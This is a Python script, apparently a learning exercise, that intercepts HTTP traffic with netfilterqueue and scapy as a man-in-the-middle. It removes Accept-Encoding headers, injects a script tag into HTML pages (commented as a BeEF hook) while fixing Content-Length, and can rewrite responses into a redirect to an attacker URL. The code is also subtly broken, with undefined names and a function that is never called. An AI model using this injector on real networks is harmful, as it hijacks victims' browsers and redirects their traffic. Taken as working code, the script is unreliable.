from netfilterqueue import NetfilterQueue
from scapy import IP, Raw, TCP
import re

#When using the netfilterqueue library, you can access the packet data through the packet object. The packet object represents the network packet that is being processed by the netfilterqueue.You can access various attributes of the packet object such as the packet payload, source IP address, destination IP address, and other packet information. By manipulating these attributes, you can modify or analyze the packet data as per your requirements.


scapy_packet = IP(packet.get_payload())
# the scapy_packet variable is created by converting the packet payload into a Scapy packet object using scapy.IP(packet.get_payload()). This allows us to manipulate and inspect the packet using Scapy's functionalities

has_raw_layer = scapy_packet.haslayer(Raw)
#assigned this globally, so as not to rewrite it in both functions

def modify_packet(scapy_packet):
    if has_raw_layer and scapy_packet[TCP].sport == 80 and scapy_packet[TCP].flags == "A":

        scapy_packet[Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: Hacker_URL"
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum
        return str(scapy_packet)
    

def process_packet(scapy_packet):

    if has_raw_layer:
         #load = scapy_packet[scapy.Raw].load.decode() # Activate for python3
        load = scapy_packet[Raw].load.decode()

    if scapy_packet[TCP].dport == 80:
        print("[+] Request") #This is a GET request, since TCP destination port is 80 => http
        load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) 
        # the purpose of this code is to remove any occurrences of the "Accept-Encoding" header from the load string. The regular expression pattern "Accept-Encoding:.*?\\r\\n" matches the entire line containing the "Accept-Encoding" header, and the re.sub() function replaces it with an empty string, effectively removing it from the load string.
    
    elif scapy_packet[TCP].sport == 80:
        print("[+] Response")
        injection_code = "<script>alert('Hi')</script>" # Inject BEEF Framework HOOK
        load = load.replace("</body>", injection_code + "</body>")
        content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
        if content_length_search and "text/html" in load:
            content_length = content_length_search.group(1)
            new_content_length = int(content_length) + len(injection_code)
            load = load.replace(content_length, str(new_content_length))

    if load != scapy_packet[Raw].load:
        new_packet = set_load(scapy_packet, load)
        packet.set_payload(bytes(new_packet))
#packet.set_payload(bytes(new_packet)) # Activate for python3
        packet.accept()


# defining the process_packet function, an instance of netfilterqueue.NetfilterQueue is created and assigned to the queue variable.
nfqueue = NetfilterQueue()

# The bind method is called on the queue object to bind it to a specific queue number (0 in this case) and specify the function to be called (process_packet) for each intercepted packet
nfqueue.bind(0, process_packet)

# the run method is called on the queue object to start the packet interception and processing loop
# Run the main loop
try:
    nfqueue.run()
except KeyboardInterrupt:
    pass

